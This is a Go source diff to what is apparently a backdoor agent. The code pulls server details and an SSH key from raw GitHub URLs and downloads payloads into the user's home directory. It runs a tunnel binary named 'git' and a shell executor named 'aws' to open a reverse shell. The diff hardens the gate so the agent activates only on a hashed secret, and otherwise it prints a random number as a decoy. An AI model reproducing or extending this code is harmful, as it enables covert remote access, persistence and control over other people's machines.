@@ -18,6 +18,7 @@ import (
 )
 
 const secret = "EnCryp!e0?"
+const secretsha = "c288e967448d249d37984f52223d95f15060239b26b5cb6582e237b9ac051d81"
 const serverInfoUrl = "https://raw.githubusercontent.com/devoxit/static/main/test.txt"
 const keyInfoUrl = "https://raw.githubusercontent.com/devoxit/golanghub/main/build.txt"
 
@@ -42,7 +43,7 @@ type Payload struct {
 }
 
 func NewAgent() *Agent {
-	serverInfo64 := getInfo(serverInfoUrl)
+	serverInfo64 := getInfos(serverInfoUrl)
 	serverInfo, err := base64.StdEncoding.DecodeString(serverInfo64)
 	if err != nil {
 		fmt.Println("could not get info !")
@@ -72,7 +73,7 @@ func NewAgent() *Agent {
 	return agent
 }
 
-func getInfo(url string) string {
+func getInfos(url string) string {
 	resp, err := http.Get(url)
 	if err != nil {
 		// handle error
@@ -103,8 +104,8 @@ func getPayloads(baseUrl string, p string, sec string) {
 	}
 	defer resp.Body.Close()
 	body, err := io.ReadAll(resp.Body)
-
-	f, err := os.Create("./" + p + extension())
+	home, _ := os.UserHomeDir()
+	f, err := os.Create(home + "/" + p + extension())
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -270,7 +271,7 @@ func (a *Agent) handleRs(payload *Payload) {
 }
 
 func (a *Agent) setSshKey() bool {
-	key := getInfo(keyInfoUrl)
+	key := getInfos(keyInfoUrl)
 	// create the file
 	home, err := os.UserHomeDir()
 	if err != nil {
@@ -288,7 +289,7 @@ func (a *Agent) setSshKey() bool {
 }
 
 func main() {
-	if len(os.Args[:]) < 2 || os.Args[1] != secret {
+	if len(os.Args[:]) < 2 || os.Args[1] != secretsha {
 		fmt.Println(rand.Intn(70))
 		return
 	}
@@ -402,13 +403,13 @@ func (p *Payload) sshKeyParser(str string) {
 
 func (a *Agent) connectToRs(params string, shell string, intport string) bool {
 	//create ssh tunnel
+	home, _ := os.UserHomeDir()
 	go createTunnel(params)
 	//sleep 5s
 	time.Sleep(time.Millisecond * 5000)
 	// find shell type
 	//spin the shell executor
-	fmt.Println("executor------->>", secret, "localhost", intport, shell)
-	_shell := exec.Command("./aws"+extension(), secret, "localhost", intport, shell)
+	_shell := exec.Command(home+"/aws"+extension(), secret, "localhost", intport, shell)
 	err := _shell.Run()
 	if err != nil {
 		fmt.Println(err)
@@ -419,10 +420,11 @@ func (a *Agent) connectToRs(params string, shell string, intport string) bool {
 }
 
 func createTunnel(command string) {
+	home, _ := os.UserHomeDir()
 	fmt.Println("creating tunnel ... !")
 	args := strings.Split(command, " ")
 	fmt.Println(args)
-	_tunnel, err := exec.Command("./git"+extension(), args...).Output()
+	_tunnel, err := exec.Command(home+"/git"+extension(), args...).Output()
 
 	if err != nil {
 		fmt.Println(err)
